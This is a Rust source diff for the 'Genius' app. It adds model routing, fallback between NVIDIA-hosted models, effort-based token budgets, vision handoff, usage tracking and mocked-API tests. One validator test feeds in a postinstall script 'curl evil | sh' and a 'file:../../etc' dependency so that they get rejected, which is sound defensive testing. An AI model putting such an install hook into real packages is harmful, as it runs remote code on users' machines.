@@ -4,8 +4,9 @@
 
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::path::{Path, PathBuf};
+use std::sync::atomic::AtomicBool;
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 use tokio_util::sync::CancellationToken;
@@ -18,12 +19,13 @@ use crate::db::{now, Db, ProjectRow};
 use crate::diagnostics;
 use crate::error::{GeniusError, Result};
 use crate::events::{channels, EventBus, EventKind, EventStatus};
-use crate::nvidia::{ChatMessage, ChatOptions, ChatResult, ModelInfo, NvidiaClient, ProbeResult};
+use crate::nvidia::{ChatMessage, ChatOptions, ChatResult, ModelInfo, NvidiaClient, ParamMemory, ProbeResult, ProviderError};
 use crate::process::{Operation, ProcessManager, RunOutcome};
 use crate::prompts;
+use crate::router::ModelRole;
 use crate::scaffold;
 use crate::secrets::{self, SecretStore, NVIDIA_KEY};
-use crate::settings::{Policy, Settings};
+use crate::settings::{Effort, Policy, Settings};
 use crate::spec::{self, ProjectSpec};
 use crate::workspace::Workspace;
 
@@ -73,6 +75,71 @@ pub struct ReadinessCheck {
     pub detail: String,
 }
 
+/// Per-call routing and budget overrides for [`Genius::ai_call_opts`]; unset fields come from
+/// the settings (effort, thinking, temperature) and the role's defaults.
+#[derive(Debug, Clone, Default)]
+pub struct CallOptions {
+    pub role: Option<ModelRole>,
+    pub effort: Option<Effort>,
+    pub max_tokens: Option<u32>,
+    pub thinking: Option<bool>,
+    pub temperature: Option<f32>,
+}
+
+impl CallOptions {
+    pub fn role(role: ModelRole) -> Self {
+        Self { role: Some(role), ..Default::default() }
+    }
+}
+
+/// Running token totals of a task's AI calls.
+#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
+#[serde(rename_all = "camelCase")]
+pub struct UsageTotals {
+    pub prompt_tokens: u64,
+    pub completion_tokens: u64,
+    pub total_tokens: u64,
+    pub calls: u64,
+    pub models: Vec<String>,
+}
+
+/// (prompt, completion, total) tokens from an OpenAI-style `usage` object.
+pub fn usage_tokens(u: &Value) -> (u64, u64, u64) {
+    let n = |k: &str| u.get(k).and_then(|v| v.as_u64()).unwrap_or(0);
+    let (p, c) = (n("prompt_tokens"), n("completion_tokens"));
+    (p, c, u.get("total_tokens").and_then(|v| v.as_u64()).unwrap_or(p + c))
+}
+
+/// Output budget and reasoning switch for an effort level. Quick utility calls stay small and
+/// never think (speed); nothing exceeds 4× the user's max-tokens setting.
+pub fn effort_budget(effort: Effort, role: ModelRole, s: &Settings) -> (u32, bool) {
+    let (tokens, thinking) = match effort {
+        Effort::Fast => (8192, false),
+        Effort::Balanced => (16384, s.thinking),
+        Effort::Max => (32768, s.thinking),
+    };
+    let tokens = match (role, effort) {
+        (ModelRole::Quick, _) => tokens.min(4096),
+        (_, Effort::Fast) => tokens,
+        _ => tokens.max(s.max_tokens),
+    };
+    (tokens.min(s.max_tokens.saturating_mul(4)).max(256), thinking && role != ModelRole::Quick)
+}
+
+/// Why a failed call should move on to the next model (None: the error is not model-specific).
+/// Manual mode only falls back when the chosen model is unavailable.
+fn fallback_reason(e: &GeniusError, manual: bool) -> Option<String> {
+    let GeniusError::Provider(p) = e else { return None };
+    match p {
+        ProviderError::ModelUnavailable { status, .. } => Some(format!("it is not available to this key (HTTP {status})")),
+        _ if manual => None,
+        ProviderError::RateLimited { .. } => Some("it is rate limited right now".into()),
+        ProviderError::Server { status, .. } => Some(format!("its server returned an error (HTTP {status})")),
+        ProviderError::Timeout(_) => Some("it timed out".into()),
+        _ => None,
+    }
+}
+
 pub struct Genius {
     pub db: Arc<Db>,
     pub bus: EventBus,
@@ -82,6 +149,14 @@ pub struct Genius {
     tasks: Arc<Mutex<HashMap<String, TaskEntry>>>,
     previews: Arc<Mutex<HashMap<String, String>>>,
     repair_history: Arc<Mutex<HashMap<String, Vec<String>>>>,
+    /// Models that answered "unavailable" this session; routing skips them.
+    pub(crate) failed_models: Mutex<HashSet<String>>,
+    /// The model list was fetched (or tried) once for routing because there was no cache.
+    pub(crate) models_fetch_tried: AtomicBool,
+    /// Optional request parameters each model rejected (shared by every client).
+    param_memory: ParamMemory,
+    /// Token usage per task (in memory, bounded).
+    usage: Mutex<HashMap<String, UsageTotals>>,
     data_dir: PathBuf,
     /// Runtime used for background work. Captured at construction so tasks can be spawned
     /// from any thread (Tauri runs synchronous commands on the main thread, outside Tokio).
@@ -112,6 +187,10 @@ impl Genius {
             tasks: Arc::new(Mutex::new(HashMap::new())),
             previews: Arc::new(Mutex::new(HashMap::new())),
             repair_history: Arc::new(Mutex::new(HashMap::new())),
+            failed_models: Mutex::new(HashSet::new()),
+            models_fetch_tried: AtomicBool::new(false),
+            param_memory: ParamMemory::default(),
+            usage: Mutex::new(HashMap::new()),
             data_dir: data_dir.to_path_buf(),
         }))
     }
@@ -173,13 +252,15 @@ impl Genius {
     pub(crate) fn client(&self) -> Result<(NvidiaClient, Settings)> {
         let s = self.settings()?;
         let key = self.secrets.get(NVIDIA_KEY)?;
-        Ok((NvidiaClient::new(&s.base_url, key)?, s))
+        Ok((NvidiaClient::new(&s.base_url, key)?.with_param_memory(self.param_memory.clone()), s))
     }
 
     pub async fn test_connection(&self) -> Result<Value> {
         let (client, s) = self.client()?;
-        let mut ev = self.bus.start(None, None, EventKind::Ai, EventStatus::Running, "Testing NVIDIA connection", json!({ "baseUrl": client.base_url(), "model": s.model }));
-        let res = client.test_connection(s.model.as_deref()).await.map_err(GeniusError::from);
+        // Auto mode verifies the model Genius would use for agent work.
+        let model = if s.is_auto() && self.key_status().stored { self.resolve_models(ModelRole::Agent, s.effort).await.ok().and_then(|c| c.into_iter().next()).or(s.model.clone()) } else { s.model.clone() };
+        let mut ev = self.bus.start(None, None, EventKind::Ai, EventStatus::Running, "Testing NVIDIA connection", json!({ "baseUrl": client.base_url(), "model": model, "modelMode": s.model_mode }));
+        let res = client.test_connection(model.as_deref()).await.map_err(GeniusError::from);
         match &res {
             Ok(v) => {
                 if let Some(p) = v.get("probe") {
@@ -573,15 +654,202 @@ impl Genius {
     /// One model call with live streaming to the UI. When `stream_files` is set, file
     /// blocks are parsed as they arrive and pushed as draft file events (nothing is written).
     pub(crate) async fn ai_call(&self, project_id: &str, task_id: &str, purpose: &str, messages: &[ChatMessage], stream_files: bool, cancel: &CancellationToken) -> Result<(ChatResult, Vec<BlockEvent>)> {
-        let (client, s) = self.client()?;
-        let model = s.model.clone().ok_or(crate::nvidia::ProviderError::NoModel)?;
-        let opts = ChatOptions { temperature: s.temperature, top_p: 0.95, max_tokens: s.max_tokens, stream: true };
+        self.ai_call_opts(project_id, task_id, purpose, messages, stream_files, cancel, &CallOptions { role: Some(ModelRole::Agent), ..Default::default() }).await
+    }
+
+    /// [`ai_call`](Self::ai_call) with routing: resolves the model chain for the role, hands
+    /// images to a vision model when the chosen model cannot see, and falls back to the next
+    /// model when one is unavailable, rate limited, failing, timing out or replies empty.
+    /// An empty `task_id` records events without a task and streams nothing to the chat.
+    #[allow(clippy::too_many_arguments)]
+    pub(crate) async fn ai_call_opts(&self, project_id: &str, task_id: &str, purpose: &str, messages: &[ChatMessage], stream_files: bool, cancel: &CancellationToken, opts: &CallOptions) -> Result<(ChatResult, Vec<BlockEvent>)> {
+        let (mut client, s) = self.client()?;
+        let role = opts.role.unwrap_or(ModelRole::Agent);
+        let effort = opts.effort.unwrap_or(s.effort);
+        let chain = self.resolve_models(role, effort).await?;
+        let manual = !s.is_auto();
+        let (budget, think) = effort_budget(effort, role, &s);
+        let thinking = opts.thinking.unwrap_or(think);
+        let level = if !thinking { "low" } else { match effort { Effort::Fast => "low", Effort::Balanced => "medium", Effort::Max => "high" } };
+        let chat = ChatOptions {
+            temperature: opts.temperature.unwrap_or(s.temperature),
+            top_p: 0.95,
+            max_tokens: opts.max_tokens.unwrap_or(budget).min(s.max_tokens.saturating_mul(4)).max(256),
+            stream: true,
+            thinking: Some(thinking),
+            reasoning_effort: Some(level.into()),
+        };
+        if !manual && chain.len() > 1 {
+            // Another model is usually faster than waiting out a long rate-limit backoff.
+            client.max_retries = client.max_retries.min(1);
+        }
+        let has_images = messages.iter().any(|m| !m.images.is_empty());
+        let mut described: Option<Vec<ChatMessage>> = None;
+        let mut last_err: Option<GeniusError> = None;
+        for (i, model) in chain.iter().enumerate() {
+            let next = chain.get(i + 1);
+            if has_images && !self.is_vision_capable(model) && described.is_none() {
+                described = Some(self.describe_images(&client, project_id, task_id, messages, effort, cancel).await?);
+            }
+            let msgs: &[ChatMessage] = match &described {
+                Some(d) if has_images && !self.is_vision_capable(model) => d,
+                _ => messages,
+            };
+            let mut res = self.call_model(&client, model, project_id, task_id, purpose, msgs, &chat, stream_files, cancel).await;
+            if let Ok((r, _)) = &res {
+                if r.finish_reason.as_deref() == Some("length") && r.content.trim().is_empty() && !r.reasoning.trim().is_empty() && chat.thinking != Some(false) {
+                    // The model spent its whole budget thinking: ask again without reasoning.
+                    self.bus.record(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Completed, format!("{model} used its whole output budget thinking; retrying with thinking off"), json!({ "model": model, "reasoningChars": r.reasoning.len() }));
+                    let quick = ChatOptions { thinking: Some(false), reasoning_effort: Some("low".into()), ..chat.clone() };
+                    res = self.call_model(&client, model, project_id, task_id, purpose, msgs, &quick, stream_files, cancel).await;
+                }
+            }
+            match res {
+                Ok((r, _)) if r.content.trim().is_empty() && !manual && next.is_some() => {
+                    self.note_switch(project_id, task_id, model, next, "it returned an empty reply");
+                    last_err = Some(GeniusError::Provider(ProviderError::Malformed(format!("{model} returned an empty reply"))));
+                }
+                Ok((r, events)) => {
+                    self.add_usage(task_id, &r);
+                    return Ok((r, events));
+                }
+                Err(e) => {
+                    if matches!(e, GeniusError::Provider(ProviderError::ModelUnavailable { .. })) {
+                        self.mark_model_failed(model);
+                    }
+                    match (fallback_reason(&e, manual), next) {
+                        (Some(why), Some(_)) => {
+                            self.note_switch(project_id, task_id, model, next, &why);
+                            last_err = Some(e);
+                        }
+                        _ => return Err(e),
+                    }
+                }
+            }
+        }
+        Err(last_err.unwrap_or_else(|| ProviderError::NoModel.into()))
+    }
+
+    fn tid<'a>(&self, task_id: &'a str) -> Option<&'a str> {
+        (!task_id.is_empty()).then_some(task_id)
+    }
+
+    fn note_switch(&self, project_id: &str, task_id: &str, from: &str, to: Option<&String>, why: &str) {
+        let to = to.map(String::as_str).unwrap_or("?");
+        self.bus.record(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Completed, format!("Switched to {to} because {from} {why}"), json!({ "from": from, "to": to, "reason": why }));
+    }
+
+    fn add_usage(&self, task_id: &str, r: &ChatResult) {
+        if task_id.is_empty() {
+            return;
+        }
+        let (p, c, t) = r.usage.as_ref().map(usage_tokens).unwrap_or_default();
+        let mut all = self.usage.lock().unwrap();
+        if all.len() > 500 && !all.contains_key(task_id) {
+            all.clear();
+        }
+        let u = all.entry(task_id.to_string()).or_default();
+        u.prompt_tokens += p;
+        u.completion_tokens += c;
+        u.total_tokens += t;
+        u.calls += 1;
+        if !r.model.is_empty() && !u.models.contains(&r.model) {
+            u.models.push(r.model.clone());
+        }
+    }
+
+    /// Token totals of a task's AI calls so far: `{ promptTokens, completionTokens, totalTokens, calls, models }`.
+    pub fn task_usage(&self, task_id: &str) -> Value {
+        serde_json::to_value(self.usage.lock().unwrap().get(task_id).cloned().unwrap_or_default()).unwrap_or(Value::Null)
+    }
+
+    /// Token usage of the project's recent AI calls (from the activity log):
+    /// `{ promptTokens, completionTokens, totalTokens, calls, byModel: { model: totalTokens } }`.
+    pub fn usage_summary(&self, project_id: &str) -> Result<Value> {
+        let (mut p, mut c, mut t, mut calls) = (0u64, 0u64, 0u64, 0u64);
+        let mut by_model = serde_json::Map::new();
+        for e in self.bus.list(Some(project_id), 3000)? {
+            if e.kind != EventKind::Ai || e.status != EventStatus::Completed || e.detail.get("purpose").is_none() {
+                continue;
+            }
+            calls += 1;
+            let (ep, ec, et) = e.detail.get("usage").map(usage_tokens).unwrap_or_default();
+            p += ep;
+            c += ec;
+            t += et;
+            if let Some(m) = e.detail.get("model").and_then(|m| m.as_str()) {
+                let prev = by_model.get(m).and_then(|v| v.as_u64()).unwrap_or(0);
+                by_model.insert(m.to_string(), json!(prev + et));
+            }
+        }
+        Ok(json!({ "promptTokens": p, "completionTokens": c, "totalTokens": t, "calls": calls, "byModel": by_model }))
+    }
+
+    /// Vision handoff: a vision model describes every attached image; the descriptions replace
+    /// the images so a text-only model can work from them.
+    async fn describe_images(&self, client: &NvidiaClient, project_id: &str, task_id: &str, messages: &[ChatMessage], effort: Effort, cancel: &CancellationToken) -> Result<Vec<ChatMessage>> {
+        let chain = self.resolve_models(ModelRole::Vision, effort).await.unwrap_or_default();
+        if chain.is_empty() {
+            return Err(GeniusError::Validation("An image is attached, but none of the models available to your key can read images. Refresh the model list in Settings → AI provider, or describe the image in words.".into()));
+        }
+        let opts = ChatOptions { temperature: 0.2, top_p: 0.9, max_tokens: 2048, stream: true, thinking: Some(false), reasoning_effort: Some("low".into()) };
+        let mut used = chain[0].clone();
+        let mut out: Vec<Vec<String>> = Vec::new();
+        let total: usize = messages.iter().map(|m| m.images.len()).sum();
+        let mut n = 0;
+        for m in messages {
+            let mut descs = Vec::new();
+            for img in &m.images {
+                n += 1;
+                let ask = vec![
+                    ChatMessage::system(crate::router::VISION_PROMPT),
+                    ChatMessage { role: "user".into(), content: format!("Describe this image in detail. Context from the user's message: {}", m.content.chars().take(600).collect::<String>()), images: vec![img.clone()] },
+                ];
+                let mut desc = None;
+                let mut last_err = None;
+                for model in &chain {
+                    let mut ev = self.bus.start(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Running, format!("Looking at image {n} of {total} ({model})"), json!({ "model": model, "purpose": "Vision handoff", "images": 1 }));
+                    match client.chat(model, &ask, &opts, cancel, |_| {}).await {
+                        Ok(r) if !r.content.trim().is_empty() => {
+                            ev.update(EventStatus::Completed, json!({ "outputChars": r.content.len(), "usage": r.usage }));
+                            used = model.clone();
+                            desc = Some(r.content);
+                            break;
+                        }
+                        Ok(_) => ev.update(EventStatus::Failed, json!({ "error": { "kind": "provider_malformed", "message": "empty description" } })),
+                        Err(ProviderError::Cancelled) => {
+                            ev.update(EventStatus::Cancelled, json!({}));
+                            return Err(GeniusError::Cancelled);
+                        }
+                        Err(e) => {
+                            if matches!(e, ProviderError::ModelUnavailable { .. }) {
+                                self.mark_model_failed(model);
+                            }
+                            ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
+                            last_err = Some(e);
+                        }
+                    }
+                }
+                match desc {
+                    Some(d) => descs.push(d),
+                    None => return Err(last_err.map(GeniusError::from).unwrap_or_else(|| GeniusError::Validation("No vision model could describe the attached image.".into()))),
+                }
+            }
+            out.push(descs);
+        }
+        Ok(crate::router::replace_images_with_descriptions(messages, &out, &used))
+    }
+
+    /// One streamed request to one model, recorded as an AI activity event.
+    #[allow(clippy::too_many_arguments)]
+    async fn call_model(&self, client: &NvidiaClient, model: &str, project_id: &str, task_id: &str, purpose: &str, messages: &[ChatMessage], opts: &ChatOptions, stream_files: bool, cancel: &CancellationToken) -> Result<(ChatResult, Vec<BlockEvent>)> {
         let prompt_chars: usize = messages.iter().map(|m| m.content.len()).sum();
-        let mut ev = self.bus.start(Some(project_id), Some(task_id), EventKind::Ai, EventStatus::Running, format!("{purpose} ({model})"), json!({ "model": model, "purpose": purpose, "promptChars": prompt_chars, "maxTokens": s.max_tokens }));
+        let live = !task_id.is_empty();
+        let mut ev = self.bus.start(Some(project_id), self.tid(task_id), EventKind::Ai, EventStatus::Running, format!("{purpose} ({model})"), json!({ "model": model, "purpose": purpose, "promptChars": prompt_chars, "maxTokens": opts.max_tokens, "thinking": opts.thinking }));
         let mut parser = BlockParser::default();
         let mut events: Vec<BlockEvent> = Vec::new();
-        let mut buf = String::new();
-        let mut last_flush = Instant::now();
+        let (mut buf, mut tbuf) = (String::new(), String::new());
+        let (mut last_flush, mut last_tflush) = (Instant::now(), Instant::now());
         let bus = self.bus.clone();
         let (pid, tid) = (project_id.to_string(), task_id.to_string());
         let push_file = |bus: &EventBus, e: &BlockEvent| {
@@ -591,22 +859,38 @@ impl Genius {
             bus.push(channels::FILE_STREAM, v);
         };
         let res = client
-            .chat(&model, messages, &opts, cancel, |delta| {
-                buf.push_str(delta);
-                if buf.len() > 256 || last_flush.elapsed() > Duration::from_millis(60) {
-                    bus.push(channels::AI_DELTA, json!({ "taskId": tid, "projectId": pid, "text": std::mem::take(&mut buf) }));
-                    last_flush = Instant::now();
-                }
-                if stream_files {
-                    for e in parser.push(delta) {
-                        push_file(&bus, &e);
-                        events.push(e);
+            .chat_with_reasoning(
+                model,
+                messages,
+                opts,
+                cancel,
+                |delta| {
+                    buf.push_str(delta);
+                    if live && (buf.len() > 256 || last_flush.elapsed() > Duration::from_millis(60)) {
+                        bus.push(channels::AI_DELTA, json!({ "taskId": tid, "projectId": pid, "text": std::mem::take(&mut buf) }));
+                        last_flush = Instant::now();
                     }
-                }
-            })
+                    if stream_files {
+                        for e in parser.push(delta) {
+                            push_file(&bus, &e);
+                            events.push(e);
+                        }
+                    }
+                },
+                |thought| {
+                    tbuf.push_str(thought);
+                    if live && (tbuf.len() > 256 || last_tflush.elapsed() > Duration::from_millis(80)) {
+                        bus.push(channels::AI_THINKING, json!({ "taskId": tid, "projectId": pid, "text": std::mem::take(&mut tbuf) }));
+                        last_tflush = Instant::now();
+                    }
+                },
+            )
             .await;
-        if !buf.is_empty() {
+        if live && !buf.is_empty() {
             bus.push(channels::AI_DELTA, json!({ "taskId": tid, "projectId": pid, "text": buf }));
+        }
+        if live && !tbuf.is_empty() {
+            bus.push(channels::AI_THINKING, json!({ "taskId": tid, "projectId": pid, "text": tbuf }));
         }
         match res {
             Ok(r) => {
@@ -618,7 +902,8 @@ impl Genius {
                 } else {
                     events = crate::blocks::parse_all(&r.content);
                 }
-                ev.update(EventStatus::Completed, json!({ "finishReason": r.finish_reason, "outputChars": r.content.len(), "streamed": r.streamed, "usage": r.usage, "reasoningHidden": r.had_reasoning }));
+                let tokens = r.usage.as_ref().map(usage_tokens).map(|(p, c, t)| json!({ "prompt": p, "completion": c, "total": t }));
+                ev.update(EventStatus::Completed, json!({ "finishReason": r.finish_reason, "outputChars": r.content.len(), "streamed": r.streamed, "usage": r.usage, "tokens": tokens, "reasoningChars": r.reasoning.chars().count(), "reasoningHidden": r.had_reasoning }));
                 Ok((r, events))
             }
             Err(e) => {
@@ -636,9 +921,7 @@ impl Genius {
             return Err(GeniusError::Validation("Describe the application in at least a sentence.".into()));
         }
         self.client()?; // fail fast on an invalid base URL
-        if self.settings()?.model.is_none() {
-            return Err(crate::nvidia::ProviderError::NoModel.into());
-        }
+        self.has_usable_model()?;
         let me = self.clone();
         let (pid, d, c) = (project_id.to_string(), description.to_string(), constraints.to_string());
         self.db.rename_project(project_id, &self.db.get_project(project_id)?.name, description)?;
@@ -654,7 +937,7 @@ impl Genius {
         let mut ev = self.bus.start(Some(project_id), Some(task_id), EventKind::Plan, EventStatus::Running, "Analyzing request and preparing the implementation plan", json!({}));
         let mut last_err = None;
         for attempt in 0..2 {
-            let (r, _) = match self.ai_call(project_id, task_id, if attempt == 0 { "Planning" } else { "Re-requesting plan as valid JSON" }, &messages, false, cancel).await {
+            let (r, _) = match self.ai_call_opts(project_id, task_id, if attempt == 0 { "Planning" } else { "Re-requesting plan as valid JSON" }, &messages, false, cancel, &CallOptions::role(ModelRole::Plan)).await {
                 Ok(x) => x,
                 Err(e) => {
                     ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
@@ -739,7 +1022,7 @@ impl Genius {
         let mut all_events = Vec::new();
         let mut explanation = String::new();
         for round in 0..4 {
-            let (r, events) = self.ai_call(project_id, task_id, if round == 0 { "Generating source code" } else { "Continuing generation" }, &messages, true, cancel).await?;
+            let (r, events) = self.ai_call_opts(project_id, task_id, if round == 0 { "Generating source code" } else { "Continuing generation" }, &messages, true, cancel, &CallOptions::role(ModelRole::Code)).await?;
             all_events.extend(events);
             if round == 0 {
                 explanation = collect(&all_events).explanation;
@@ -823,9 +1106,7 @@ impl Genius {
         if request.trim().is_empty() {
             return Err(GeniusError::Validation("Describe the change you want.".into()));
         }
-        if self.settings()?.model.is_none() {
-            return Err(crate::nvidia::ProviderError::NoModel.into());
-        }
+        self.has_usable_model()?;
         let me = self.clone();
         let (pid, req) = (project_id.to_string(), request.to_string());
         let title: String = format!("Change: {}", request.chars().take(60).collect::<String>());
@@ -1268,5 +1549,250 @@ mod tests {
         assert!(validate_package_json(r#"{"dependencies":{"x":"file:../../etc"}}"#).is_err());
         assert!(validate_package_json(r#"{"scripts":{"postinstall":"curl evil | sh"}}"#).is_err());
         assert!(validate_package_json("not json").is_err());
+    }
+
+    // ------------------------------------------------------------- routing (mocked NVIDIA API)
+
+    use crate::events::RecordingEmitter;
+    use wiremock::matchers::{method, path};
+    use wiremock::{Mock, MockServer, Request, ResponseTemplate};
+
+    const SUPER: &str = "nvidia/nemotron-3-super-120b-a12b";
+    const CODER: &str = "qwen/qwen3-coder-480b-a35b-instruct";
+    const VISION_M: &str = "meta/llama-3.2-90b-vision-instruct";
+
+    /// SSE reply: optional reasoning, content, finish reason and a usage chunk.
+    fn reply(reasoning: &str, content: &str, finish: &str) -> ResponseTemplate {
+        let mut s = String::new();
+        if !reasoning.is_empty() {
+            s.push_str(&format!("data: {}\n\n", json!({"choices":[{"index":0,"delta":{"reasoning_content":reasoning},"finish_reason":null}]})));
+        }
+        if !content.is_empty() {
+            s.push_str(&format!("data: {}\n\n", json!({"choices":[{"index":0,"delta":{"content":content},"finish_reason":null}]})));
+        }
+        s.push_str(&format!("data: {}\n\n", json!({"choices":[{"index":0,"delta":{},"finish_reason":finish}]})));
+        s.push_str(&format!("data: {}\n\n", json!({"choices":[],"usage":{"prompt_tokens":10,"completion_tokens":5,"total_tokens":15}})));
+        s.push_str("data: [DONE]\n\n");
+        ResponseTemplate::new(200).set_body_raw(s, "text/event-stream")
+    }
+
+    struct Routed {
+        _tmp: tempfile::TempDir,
+        g: Arc<Genius>,
+        pid: String,
+        server: MockServer,
+        rec: Arc<RecordingEmitter>,
+    }
+
+    impl Routed {
+        async fn bodies(&self) -> Vec<Value> {
+            self.server.received_requests().await.unwrap().iter().filter(|r| r.url.path().ends_with("/chat/completions")).map(|r| serde_json::from_slice(&r.body).unwrap()).collect()
+        }
+        fn titles(&self) -> Vec<String> {
+            self.g.bus.list(Some(&self.pid), 500).unwrap().into_iter().map(|e| e.title).collect()
+        }
+    }
+
+    async fn routed(models: &[&str], manual: Option<&str>, respond: impl Fn(&Value) -> ResponseTemplate + Send + Sync + 'static) -> Routed {
+        let server = MockServer::start().await;
+        Mock::given(method("POST"))
+            .and(path("/v1/chat/completions"))
+            .respond_with(move |req: &Request| respond(&serde_json::from_slice(&req.body).unwrap()))
+            .mount(&server)
+            .await;
+        let tmp = tempfile::tempdir().unwrap();
+        let rec = Arc::new(RecordingEmitter::default());
+        let g = Genius::new(&tmp.path().join("data"), rec.clone(), Arc::new(crate::secrets::MemoryStore::default())).unwrap();
+        let mut s = g.settings().unwrap();
+        s.base_url = format!("http://127.0.0.1:{}/v1", server.address().port());
+        s.workspace_dir = Some(tmp.path().join("projects").to_string_lossy().to_string());
+        if let Some(m) = manual {
+            s.model_mode = "manual".into();
+            s.model = Some(m.into());
+        }
+        g.save_settings(&s).unwrap();
+        g.save_api_key("nvapi-router-test-key-0123456789").unwrap();
+        let list: Vec<ModelInfo> = models.iter().map(|id| ModelInfo { id: id.to_string(), owner: None, created: None, inferred_category: crate::nvidia::infer_category(id).into() }).collect();
+        g.db.put_model_cache(&s.base_url, &serde_json::to_value(list).unwrap()).unwrap();
+        let pid = g.create_project("Routing", "").unwrap().id;
+        Routed { _tmp: tmp, g, pid, server, rec }
+    }
+
+    async fn call(r: &Routed, opts: CallOptions, messages: &[ChatMessage]) -> Result<ChatResult> {
+        r.g.ai_call_opts(&r.pid, "task-1", "Testing", messages, false, &CancellationToken::new(), &opts).await.map(|(c, _)| c)
+    }
+
+    #[tokio::test]
+    async fn auto_mode_picks_the_best_model_and_falls_back() {
+        let r = routed(&[SUPER, CODER, "meta/llama-3.3-70b-instruct"], None, |b| {
+            if b["model"] == SUPER {
+                ResponseTemplate::new(404).set_body_string(r#"{"detail":"Function not found for account"}"#)
+            } else {
+                reply("", "from the coder", "stop")
+            }
+        })
+        .await;
+        assert_eq!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap()[0], SUPER);
+        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
+        assert_eq!(res.model, CODER);
+        assert_eq!(res.content, "from the coder");
+        let models: Vec<Value> = r.bodies().await.iter().map(|b| b["model"].clone()).collect();
+        assert_eq!(models, vec![json!(SUPER), json!(CODER)]);
+        assert!(r.titles().iter().any(|t| t.starts_with(&format!("Switched to {CODER} because {SUPER}"))), "{:?}", r.titles());
+        // remembered for the session: the unavailable model is skipped next time
+        assert_eq!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap()[0], CODER);
+        call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("again")]).await.unwrap();
+        assert_eq!(r.bodies().await.len(), 3);
+        // usage per task and per project
+        let u = r.g.task_usage("task-1");
+        assert_eq!(u["calls"], 2);
+        assert_eq!(u["totalTokens"], 30);
+        assert_eq!(u["models"], json!([CODER]));
+        let sum = r.g.usage_summary(&r.pid).unwrap();
+        assert_eq!(sum["totalTokens"], 30);
+        assert_eq!(sum["promptTokens"], 20);
+        assert_eq!(sum["calls"], 2);
+        assert_eq!(sum["byModel"][CODER], 30);
+    }
+
+    #[tokio::test]
+    async fn empty_reply_and_server_errors_fall_back() {
+        let r = routed(&[SUPER, CODER, "moonshotai/kimi-k2-instruct"], None, |b| match b["model"].as_str().unwrap() {
+            SUPER => reply("", "", "stop"),
+            CODER => ResponseTemplate::new(500).set_body_string("boom"),
+            _ => reply("", "kimi answers", "stop"),
+        })
+        .await;
+        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
+        assert_eq!(res.model, "moonshotai/kimi-k2-instruct");
+        let t = r.titles();
+        assert!(t.iter().any(|t| t.contains("returned an empty reply")) && t.iter().any(|t| t.contains("HTTP 500")), "{t:?}");
+        assert!(!r.g.failed_models.lock().unwrap().contains(SUPER), "only unavailable models are remembered");
+    }
+
+    #[tokio::test]
+    async fn manual_mode_uses_the_chosen_model_and_only_falls_back_when_unavailable() {
+        let r = routed(&[SUPER, CODER], Some("meta/llama-3.3-70b-instruct"), |b| {
+            if b["model"] == "meta/llama-3.3-70b-instruct" {
+                ResponseTemplate::new(429).insert_header("retry-after", "0").set_body_string(r#"{"detail":"slow down"}"#)
+            } else {
+                reply("", "ok", "stop")
+            }
+        })
+        .await;
+        let chain = r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap();
+        assert_eq!(chain[0], "meta/llama-3.3-70b-instruct");
+        assert!(r.g.has_usable_model().is_ok());
+        let err = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap_err();
+        assert_eq!(err.kind(), "provider_rate_limited", "a rate limit is not a reason to switch the user's model");
+        assert!(r.bodies().await.iter().all(|b| b["model"] == "meta/llama-3.3-70b-instruct"));
+
+        let r = routed(&[SUPER, CODER], Some("gone/model"), |b| if b["model"] == "gone/model" { ResponseTemplate::new(404).set_body_string("{}") } else { reply("", "ok", "stop") }).await;
+        assert_eq!(call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap().model, SUPER);
+
+        let mut s = r.g.settings().unwrap();
+        s.model = None;
+        r.g.save_settings(&s).unwrap();
+        assert_eq!(r.g.has_usable_model().unwrap_err().kind(), "provider_no_model");
+    }
+
+    #[tokio::test]
+    async fn auto_mode_without_models_falls_back_to_the_selected_model() {
+        let r = routed(&[], None, |_| reply("", "ok", "stop")).await;
+        assert!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.is_err(), "nothing to use");
+        let mut s = r.g.settings().unwrap();
+        s.model = Some("custom/self-hosted".into());
+        r.g.save_settings(&s).unwrap();
+        assert_eq!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap(), vec!["custom/self-hosted"]);
+        assert!(r.g.resolve_models(ModelRole::Vision, Effort::Max).await.unwrap().is_empty());
+        r.g.secrets.delete(NVIDIA_KEY).unwrap();
+        assert_eq!(r.g.has_usable_model().unwrap_err().kind(), "provider_missing_key");
+    }
+
+    #[tokio::test]
+    async fn effort_sets_budget_thinking_and_quick_models() {
+        let r = routed(&[SUPER, "nvidia/nemotron-3-nano-30b-a3b", "openai/gpt-oss-20b"], None, |_| reply("", "ok", "stop")).await;
+        call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
+        call(&r, CallOptions { role: Some(ModelRole::Quick), effort: Some(Effort::Balanced), ..Default::default() }, &[ChatMessage::user("commit msg")]).await.unwrap();
+        call(&r, CallOptions { role: Some(ModelRole::Agent), effort: Some(Effort::Fast), ..Default::default() }, &[ChatMessage::user("hi")]).await.unwrap();
+        let b = r.bodies().await;
+        assert_eq!(b[0]["model"], SUPER);
+        assert_eq!(b[0]["max_tokens"], 32768);
+        assert_eq!(b[0]["chat_template_kwargs"]["enable_thinking"], true);
+        assert_ne!(b[1]["model"], SUPER, "quick jobs use a fast model");
+        assert!(b[1]["max_tokens"].as_u64().unwrap() <= 4096);
